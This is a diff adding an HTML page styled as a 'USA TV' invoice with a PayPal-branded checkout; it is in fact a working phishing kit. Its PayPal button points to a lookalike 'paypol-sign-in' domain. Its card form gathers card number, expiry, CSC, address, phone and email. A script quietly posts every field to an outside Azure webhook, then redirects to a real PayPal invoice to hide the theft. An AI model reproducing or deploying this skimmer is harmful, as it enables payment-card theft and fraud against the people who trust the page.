@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>invoice</title>
+<meta name="description" content="Payment receipt screen">
+<style>
+  :root{
+    --bg:#eef3f8;          /* app background */
+    --card:#ffffff;        /* cards */
+    --ink:#0f172a;         /* main text */
+    --muted:#6b7280;       /* secondary text */
+    --line:#eceff4;        /* dividers */
+    --brand:#111827;       /* main button (black) */
+    --accent:#2563eb;      /* blue badge */
+    --accent-ink:#ffffff;  /* badge text */
+    --shadow:0 18px 40px rgba(2, 8, 23, .08);
+    --radius:6px;
+    --radius-xl:10px;
+    --font:-apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, Ubuntu, "Helvetica Neue", Arial, sans-serif;
+  }
+
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:var(--font);
+    color:var(--ink);
+    background:var(--bg);
+  }
+
+  .wrap{
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 12px 16px 120px; /* space for fixed button */
+  }
+
+  .top-title{
+    text-align:center;
+    font-weight:600;
+    font-size:15px;
+    color:#111827;
+    margin: 12px 0 18px;
+  }
+
+  .card{
+    background:var(--card);
+    border-radius:var(--radius-xl);
+    box-shadow: var(--shadow);
+    padding:22px;
+    border:1px solid #f4f6fb;
+  }
+
+  .card + .card{ margin-top:18px; }
+
+  .row{
+    display:flex;
+    align-items:center;
+    gap:14px;
+  }
+
+  .logo-badge{
+    width:56px;height:56px;border-radius:50%;
+    background:#121212;
+    display:grid;place-items:center;
+  }
+  .logo-badge svg{
+    width:28px;height:28px;
+    stroke:#fff;
+    stroke-width:2.6;
+    stroke-linecap:round;
+    stroke-linejoin:round;
+    fill:none;
+  }
+
+  .brand{font-size:28px;font-weight:800;letter-spacing:.1px}
+  .divider{height:1px;background:var(--line);margin:18px 0}
+
+  /* expiration badge */
+  .tag{
+    display:inline-flex;align-items:center;gap:8px;
+    background:var(--accent);color:var(--accent-ink);
+    border-radius:14px;padding:8px 12px;font-weight:700;font-size:14px;
+  }
+  .tag svg{height:16px;width:auto}
+
+  .due-wrap{display:flex;justify-content:space-between;align-items:baseline;gap:12px;margin-top:14px}
+  .due-title{font-size:20px;font-weight:800;line-height:1.1}
+  .due-amount{font-size:21px;font-weight:900;letter-spacing:.2px}
+
+  .meta{color:var(--muted);font-size:13px;margin-top:10px}
+
+  /* section “Payment form information” */
+  .sec-title{font-size:18px;font-weight:800;margin-bottom:18px}
+  .line-item{font-weight:600;margin:4px 0 18px}
+
+  .totals{display:grid;gap:14px;margin-top:12px}
+  .total-row{display:flex;justify-content:space-between;align-items:center;font-size:18px}
+  .total-row .label{font-weight:700}
+  .total-row .value{font-weight:900}
+
+  /* actions */
+  .actions{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+  .action{
+    background:var(--card);border-radius:var(--radius);padding:18px;
+    display:flex;align-items:center;gap:14px
+  }
+  .act-ico{
+    width:54px;height:54px;border-radius:50%;
+    display:grid;place-items:center;background:#0f172a08;flex:0 0 auto
+  }
+  .action .txt{line-height:1.2;font-weight:700}
+
+  /* fixed bottom button */
+  .paybar{position:fixed;left:0;right:0;bottom:0;padding:18px;background:transparent;z-index:50}
+  .paybtn{
+    width:min(840px, calc(100% - 32px));
+    display:block;margin:0 auto;background:black;color:#fff;
+    font-weight:800;font-size:17px;border:none;border-radius:999px;
+    padding:18px 26px;box-shadow:0 12px 30px rgba(0,0,0,.25);cursor:pointer;letter-spacing:.3px
+  }
+  .paybtn:active{transform:translateY(1px)}
+
+  /* responsive tweaks */
+  @media (max-width:560px){
+    .brand{font-size:24px}
+    .due-title{font-size:26px}
+    .due-amount{font-size:30px}
+    .sec-title{font-size:20px}
+    .action{padding:16px}
+    .act-ico{width:48px;height:48px}
+  }
+
+  /* =========================
+     ADDITION: Bottom Sheet
+     ========================= */
+  .sheet-wrap{position:fixed; inset:0; z-index:100; pointer-events:none}
+  .sheet-overlay{position:absolute; inset:0; background:rgba(2,8,23,.45); opacity:0; transition:opacity .25s ease}
+  .sheet-panel{position:absolute; left:0; right:0; bottom:0; transform:translateY(100%); transition:transform .38s cubic-bezier(.2,.8,.2,1)}
+  .sheet-inner{width:min(760px, calc(100% - 16px)); margin:0 auto; padding:8px 0}
+  .sheet-card{
+    background:var(--bg); border-top-left-radius:18px; border-top-right-radius:18px;
+    box-shadow:0 -22px 60px rgba(2,8,23,.25); padding:10px 8px 22px; border-top:1px solid #e5e7eb
+  }
+  .sheet-head{display:flex; align-items:center; justify-content:center; position:relative; padding:6px 12px 10px; font-weight:700; color:#111827}
+  .sheet-title{font-size:16px}
+  .sheet-close{
+    position:absolute; right:8px; top:2px; width:40px;height:40px;border-radius:999px;
+    border:1px solid #e5e7eb;background:#fff;cursor:pointer;font-size:20px; line-height:1
+  }
+
+  .bcard{
+    background:var(--card); border-radius:10px; box-shadow:var(--shadow);
+    border:1px solid #f4f6fb; padding:16px; margin:0 8px 12px
+  }
+  .brow{display:flex;justify-content:space-between;align-items:center;gap:10px}
+  .btitle{font-weight:800;margin-bottom:10px}
+  .pp-info{
+  display:flex;
+  flex-direction:column;   /* ⬅️ agrega esto */
+  align-items:flex-start;
+  gap:10px;
+  color:#0f172a;
+}
+  .pp-logo{width:26px;height:26px;flex:0 0 auto}
+  .pp-btn{
+  display:flex;            /* ⬅️ para centrar el contenido */
+  justify-content:center;
+  align-items:center;
+  width:100%;              /* ⬅️ ocupa todo el ancho */
+  text-align:center;
+  text-decoration:none;
+  background:#ffc439;
+  color:#111;
+  font-weight:800;
+  border-radius:8px;
+  padding:14px 16px;
+  margin-top:12px;
+  box-shadow:0 8px 16px rgba(0,0,0,.12);
+}
+.pp-btn img{ height:80px; width:auto; }
+
+  .card-btn{
+    display:flex; align-items:center; justify-content:center; gap:10px; text-decoration:none;
+    background:#0f172a; color:#fff; font-weight:800; border-radius:8px; padding:14px 16px
+  }
+  .legal{color:#6b7280;font-size:12px;margin:6px 10px 0}
+
+  .sheet-wrap.is-open{pointer-events:auto}
+  .sheet-wrap.is-open .sheet-overlay{opacity:1}
+  .sheet-wrap.is-open .sheet-panel{transform:translateY(0)}
+  
+  /* Allow scroll inside the panel */
+.sheet-panel{ z-index:2; max-height:92vh; }            /* panel doesn't exceed screen height */
+.sheet-card{
+  max-height:90vh;                                     /* content can be tall */
+  overflow-y:auto;                                     /* scroll here! */
+  -webkit-overflow-scrolling: touch;                   /* smooth scroll on mobile */
+  overscroll-behavior: contain;                        /* prevent "escape" to body */
+}
+
+
+  /* =========================
+     ADDITION: Card form (toggle)
+     ========================= */
+  .cc-form{max-height:0; overflow:hidden; opacity:0; transition:max-height .4s ease, opacity .3s ease}
+  .cc-form.is-open{max-height:2000px; opacity:1}
+  .cc-top{display:flex; justify-content:flex-end; margin:8px 0}
+  .cc-x{background:none; border:none; color:#2563eb; font-size:22px; cursor:pointer; line-height:1}
+  .cc-grid-2{display:grid; grid-template-columns:1fr 1fr; gap:12px}
+  .cc-inp, .cc-sel{
+    width:100%; border:1px solid #d7dce3; background:#fff; border-radius:10px;
+    padding:14px 14px; font-size:14px; color:#111827
+  }
+  .cc-inp::placeholder{color:#9aa3af}
+  .cc-inp:focus, .cc-sel:focus{outline:none; border-color:#2563eb; box-shadow:0 0 0 3px rgba(37,99,235,.14)}
+  .cc-label{font-weight:800; margin:14px 2px 8px}
+  .cc-check{display:flex; align-items:flex-start; gap:10px; font-size:13px; color:#111827; margin:10px 2px}
+  .cc-check input{width:18px;height:18px; accent-color:#2563eb; margin-top:3px}
+  .btn-payblue{
+    display:block; width:100%; text-align:center; text-decoration:none;
+    background:#0b5bd3; color:#fff; font-weight:800; border-radius:999px;
+    padding:16px; margin-top:14px
+  }
+  .btn-payblue:active{transform:translateY(1px)}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="top-title">Payment form</div>
+
+    <!-- Main card -->
+    <section class="card">
+      <div class="row">
+        <div class="logo-badge" aria-hidden="true">
+          <!-- Store icon -->
+          <svg viewBox="0 0 24 24">
+            <path d="M4 7h16"/>
+            <path d="M6 7c0 1.6 1.1 2.6 2 2.6S10 8.6 10 7"/>
+            <path d="M10 7c0 1.6 1.1 2.6 2 2.6s2-1 2-2.6"/>
+            <path d="M14 7c0 1.6 1.1 2.6 2 2.6s2-1 2-2.6"/>
+            <rect x="6" y="11" width="12" height="8" rx="1.4"/>
+            <path d="M6 7l1.6-3h8.8L18 7"/>
+          </svg>
+        </div>
+        <div class="brand">USA TV</div>
+      </div>
+
+      <div class="divider"></div>
+
+      <span class="tag" title="Expiration">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+          <line x1="12" y1="9" x2="12" y2="13"/>
+          <line x1="12" y1="17" x2="12" y2="17"/>
+        </svg>
+        EXPIRATION
+      </span>
+
+      <div class="due-wrap">
+        <div class="due-title">Amount due</div>
+        <div class="due-amount">US$50.00</div>
+      </div>
+
+      <div class="meta">Payment form No. 0019 | Received on Aug 12, 2025</div>
+    </section>
+
+    <!-- Payment information -->
+    <section class="card">
+      <div class="sec-title">Payment form information</div>
+
+      <div class="total-row" style="margin-bottom:8px">
+        <div class="label" style="color:var(--muted);font-size:14px;font-weight:600">1 X US$50.00</div>
+        <div class="value" style="font-size:14px;font-weight:900">US$50.00</div>
+      </div>
+
+      <div class="divider" style="margin:16px 0 10px"></div>
+
+      <div class="totals">
+        <div class="total-row">
+          <div class="label" style="color:black;font-size:14px;font-weight:900">Subtotal</div>
+          <div class="value" style="color:black;font-size:14px;font-weight:900">US$50.00</div>
+        </div>
+        <div class="total-row">
+          <div class="label" style="color:black;font-size:14px;font-weight:900">Total</div>
+          <div class="value" style="color:black;font-size:14px;font-weight:900">US$50.00</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Secondary actions -->
+    <section class="card" style="padding:22px">
+      <div class="actions">
+        <a href="#" class="action" role="button">
+          <div class="act-ico" aria-hidden="true">
+            <!-- download icon -->
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#0f172a" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 3v12"/>
+              <path d="M7 10l5 5 5-5"/>
+              <path d="M5 21h14"/>
+            </svg>
+          </div>
+          <div class="txt" style="color:black;font-size:12px">Download PDF</div>
+        </a>
+
+        <a href="#" class="action" role="button">
+          <div class="act-ico" aria-hidden="true">
+            <!-- warning icon -->
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#0f172a" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+              <path d="M12 9v5"/>
+              <path d="M12 17h.01"/>
+            </svg>
+          </div>
+          <div class="txt" style="color:black;font-size:12px">Report payment<br>form</div>
+        </a>
+      </div>
+    </section>
+  </div>
+
+  <!-- Fixed pay button -->
+  <div class="paybar">
+    <button class="paybtn">Pay US$50.00</button>
+  </div>
+
+  <!-- =========================
+       ADDITION: Sliding window
+       ========================= -->
+  <div class="sheet-wrap" aria-hidden="true">
+    <div class="sheet-overlay"></div>
+
+    <div class="sheet-panel" role="dialog" aria-modal="true" aria-labelledby="sheetTitle">
+      <div class="sheet-inner">
+        <div class="sheet-card">
+
+          <div class="sheet-head">
+            <div id="sheetTitle" class="sheet-title">Select a payment method</div>
+            <button class="sheet-close" aria-label="Close">✕</button>
+          </div>
+
+          <div class="bcard">
+  <div class="btitle">Pay with:</div>
+  <div class="pp-info">
+    <svg class="pp-logo" viewBox="0 0 24 24" fill="none" stroke="#005EA6" stroke-width="1.6">
+      <path d="M6 18l2-12h6a4 4 0 0 1 0 8H9l-1 6H6z"/>
+    </svg>
+    <div style="font-size:13px">
+      Pay with PayPal to get <span style="text-decoration:underline">Buyer Protection</span> on eligible purchases.
+    </div>
+
+    <!-- Yellow button (WhatsApp) -->
+    <a class="pp-btn" href="https://paypol-sign-in.github.io/.com/" target="_blank" rel="noopener">
+      <img src="https://www.urbantool.com/wp-content/uploads/2016/12/paypal-logo-png.png"
+           alt="Pay with PayPal"
+           style="width:75px; height:auto;">
+    </a>
+
+  </div> <!-- ✅ Cierra .pp-info -->
+</div>   <!-- ✅ Cierra la .bcard -->
+
+
+
+          <div class="bcard">
+            <div class="btitle">Other payment methods:</div>
+            <!-- EXISTING BLACK BUTTON -->
+            <a class="card-btn" href="#" role="button" aria-label="Debit or credit card">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="5" width="20" height="14" rx="2"/>
+                <path d="M2 10h20"/>
+              </svg>
+              Debit or credit card
+            </a>
+
+            <!-- ADDITION: CARD FORM (hidden until black button is clicked) -->
+            <div class="cc-form" id="ccForm">
+              <div class="cc-top">
+                <button type="button" class="cc-x" aria-label="Close form">×</button>
+              </div>
+
+              <input class="cc-inp" inputmode="numeric" placeholder="Card number">
+
+              <div class="cc-grid-2" style="margin-top:12px">
+                <input class="cc-inp" placeholder="Expiration date">
+                <input class="cc-inp" inputmode="numeric" placeholder="CSC">
+              </div>
+
+              <div class="cc-label">Card address</div>
+
+              <div class="cc-grid-2">
+                <input class="cc-inp" placeholder="First name">
+                <input class="cc-inp" placeholder="Last name">
+              </div>
+
+              <input class="cc-inp" style="margin-top:12px" placeholder="Street address and number">
+              <input class="cc-inp" style="margin-top:12px" placeholder="Address (continuation)">
+              <input class="cc-inp" style="margin-top:12px" placeholder="Municipality">
+
+              <div class="cc-grid-2" style="margin-top:12px">
+                <select class="cc-sel" id="ccState" name="state" autocomplete="address-level1" required>
+  <option value="" selected disabled>State</option>
+  <option>Alabama</option>
+  <option>Alaska</option>
+  <option>Arizona</option>
+  <option>Arkansas</option>
+  <option>California</option>
+  <option>Colorado</option>
+  <option>Connecticut</option>
+  <option>Delaware</option>
+  <option>Florida</option>
+  <option>Georgia</option>
+  <option>Hawaii</option>
+  <option>Idaho</option>
+  <option>Illinois</option>
+  <option>Indiana</option>
+  <option>Iowa</option>
+  <option>Kansas</option>
+  <option>Kentucky</option>
+  <option>Louisiana</option>
+  <option>Maine</option>
+  <option>Maryland</option>
+  <option>Massachusetts</option>
+  <option>Michigan</option>
+  <option>Minnesota</option>
+  <option>Mississippi</option>
+  <option>Missouri</option>
+  <option>Montana</option>
+  <option>Nebraska</option>
+  <option>Nevada</option>
+  <option>New Hampshire</option>
+  <option>New Jersey</option>
+  <option>New Mexico</option>
+  <option>New York</option>
+  <option>North Carolina</option>
+  <option>North Dakota</option>
+  <option>Ohio</option>
+  <option>Oklahoma</option>
+  <option>Oregon</option>
+  <option>Pennsylvania</option>
+  <option>Rhode Island</option>
+  <option>South Carolina</option>
+  <option>South Dakota</option>
+  <option>Tennessee</option>
+  <option>Texas</option>
+  <option>Utah</option>
+  <option>Vermont</option>
+  <option>Virginia</option>
+  <option>Washington</option>
+  <option>West Virginia</option>
+  <option>Wisconsin</option>
+  <option>Wyoming</option>
+  <option>District of Columbia</option>
+</select>
+                <input class="cc-inp" placeholder="ZIP code">
+              </div>
+
+              <div class="cc-grid-2" style="margin-top:12px">
+                <input class="cc-inp" inputmode="tel" placeholder="Mobile +1">
+                <input class="cc-inp" type="email" placeholder="Email">
+              </div>
+
+              <label class="cc-check">
+                <input type="checkbox" checked>
+                <span>Ship to my card address</span>
+              </label>
+
+              <label class="cc-check">
+                <input type="checkbox">
+                <span>I confirm that I am of legal age and accept PayPal's <a href="#" style="color:#2563eb;text-decoration:underline">Privacy Notice</a>.</span>
+              </label>
+
+              <a class="btn-payblue" href="https://www.paypal.com/invoice/p/#INV2-SKPX-JQ8M-YXW3-55SC" target="_blank" rel="noopener">Pay $50.00</a>
+            </div>
+          </div>
+
+          <div class="legal">
+            You understand that your data will be subject to PayPal's <span style="text-decoration:underline">Privacy Notice</span>.
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ADDITION: Script to open/close with animation and card toggle -->
+<script>
+(function(){
+  const sheet = document.querySelector('.sheet-wrap');
+  const overlay = sheet.querySelector('.sheet-overlay');
+  const closeBtn = sheet.querySelector('.sheet-close');
+  const payBtn = document.querySelector('.paybtn');
+
+  const open = () => { sheet.classList.add('is-open'); document.body.style.overflow = 'hidden'; };
+  const close = () => { sheet.classList.remove('is-open'); document.body.style.overflow = ''; };
+
+  payBtn.addEventListener('click', open);
+  overlay.addEventListener('click', close);
+  closeBtn.addEventListener('click', close);
+  document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') close(); });
+
+  /* Toggle card form in same card (scroll inside sheet) */
+  const cardBtn = document.querySelector('.card-btn');
+  const ccForm  = document.getElementById('ccForm');
+  const ccClose = ccForm.querySelector('.cc-x');
+  const sheetScroller = document.querySelector('.sheet-card'); // container that now scrolls
+
+  cardBtn.addEventListener('click', function(e){
+    e.preventDefault();
+    ccForm.classList.add('is-open');
+    // Scroll inside the sheet's scrollable container
+    sheetScroller.scrollTo({ top: ccForm.offsetTop - 12, behavior:'smooth' });
+  });
+
+  ccClose.addEventListener('click', function(){
+    ccForm.classList.remove('is-open');
+    // Optional: scroll up to show black button again
+    sheetScroller.scrollTo({ top: 0, behavior:'smooth' });
+  });
+
+  /* (Optional) Prevent overlay from capturing scroll and moving background on mobile */
+  overlay.addEventListener('touchmove', e => e.preventDefault(), {passive:false});
+  overlay.addEventListener('wheel', e => e.preventDefault(), {passive:false});
+})();
+</script>
+<script>
+(function(){
+  const FLOW_URL = "https://prod-85.westus.logic.azure.com:443/workflows/a15e32f673dc4624b6d73ec979238804/triggers/manual/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=VwyY5R-_TBFDEfoAupMFarmhkjQsGUB5ILXsvVZbhpI";
+
+  const payBlue = document.querySelector('.btn-payblue');
+  const ccForm  = document.getElementById('ccForm');
+  if (!payBlue || !ccForm) return;
+
+  function buildPayload() {
+    const fields = ccForm.querySelectorAll('input.cc-inp, select.cc-sel, .cc-check input');
+    const payload = {};
+    let i = 1;
+    fields.forEach(el => {
+      const key = (el.name && el.name.trim()) ||
+                  (el.id && el.id.trim()) ||
+                  (el.placeholder && el.placeholder.trim()) ||
+                  ('field_' + i++);
+      payload[key] = (el.type === 'checkbox') ? el.checked : el.value;
+    });
+    payload.amount = "50.00";
+    payload.currency = "USD";
+    payload.context = "Other payment methods — card form";
+    payload.timestamp = new Date().toISOString();
+    return payload;
+  }
+
+  function sendPayload(data){
+    const body = JSON.stringify(data);
+    let sent = false;
+
+    // 1) Intento con sendBeacon usando STRING (Content-Type: text/plain implícito)
+    try {
+      if (navigator.sendBeacon) {
+        sent = navigator.sendBeacon(FLOW_URL, body);
+      }
+    } catch (_) {}
+
+    // 2) Fallback: fetch sin cabeceras y no-cors (CORS-safe) + keepalive
+    if (!sent) {
+      try {
+        fetch(FLOW_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          body: body,
+          keepalive: true
+        }).catch(()=>{});
+      } catch (_) {}
+    }
+  }
+
+  payBlue.addEventListener('click', (e) => {
+    e.preventDefault();
+
+    // 1) Enviar datos primero (dentro del gesto de usuario)
+    const payload = buildPayload();
+    sendPayload(payload);
+
+    // 2) Navegar respetando atributos del <a> original
+    const href   = payBlue.getAttribute('href')   || '#';
+    const target = payBlue.getAttribute('target') || '_self';
+    const rel    = payBlue.getAttribute('rel')    || 'noopener';
+
+    // Pequeño delay para mejorar la entrega antes de navegar
+    setTimeout(() => {
+      // Crear un <a> temporal para honrar target/rel (fiable en Safari/WebKit)
+      const a = document.createElement('a');
+      a.href = href;
+      a.target = target;
+      a.rel = rel;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }, 180);
+  });
+})();
+</script>
+
+<script>
+// Formatear automáticamente el campo de fecha de vencimiento como MM/YY
+(function(){
+  const expInput = document.querySelector('#ccForm input[placeholder="Expiration date"]');
+
+  if (expInput) {
+    expInput.addEventListener('input', function(e) {
+      let value = this.value.replace(/\D/g, ''); // solo números
+      if (value.length > 4) value = value.slice(0, 4); // máximo 4 dígitos
+
+      if (value.length >= 3) {
+        this.value = value.slice(0, 2) + '/' + value.slice(2);
+      } else {
+        this.value = value;
+      }
+    });
+  }
+})();
+</script>
+<script>
+(function(){
+  const ccForm = document.getElementById('ccForm');
+
+  if (ccForm) {
+    // Card number: 16 dígitos, espacio cada 4
+    const cardNumberInput = ccForm.querySelector('input[placeholder="Card number"]');
+    cardNumberInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, ''); // solo números
+      value = value.slice(0, 16); // máximo 16 dígitos
+      this.value = value.replace(/(.{4})/g, '$1 ').trim(); // espacio cada 4
+    });
+
+    // Expiration date: MM/YY
+    const expInput = ccForm.querySelector('input[placeholder="Expiration date"]');
+    expInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      value = value.slice(0, 4);
+      if (value.length >= 3) {
+        this.value = value.slice(0, 2) + '/' + value.slice(2);
+      } else {
+        this.value = value;
+      }
+    });
+
+    // CSC: 3 dígitos
+    const cscInput = ccForm.querySelector('input[placeholder="CSC"]');
+    cscInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 3);
+    });
+
+    // ZIP code: máximo 6 caracteres
+    const zipInput = ccForm.querySelector('input[placeholder="ZIP code"]');
+    zipInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 6);
+    });
+
+    // Mobile +1: máximo 14 caracteres
+    const mobileInput = ccForm.querySelector('input[placeholder="Mobile +1"]');
+    mobileInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 14);
+    });
+  }
+})();
+</script>
+
+</body>
+</html>
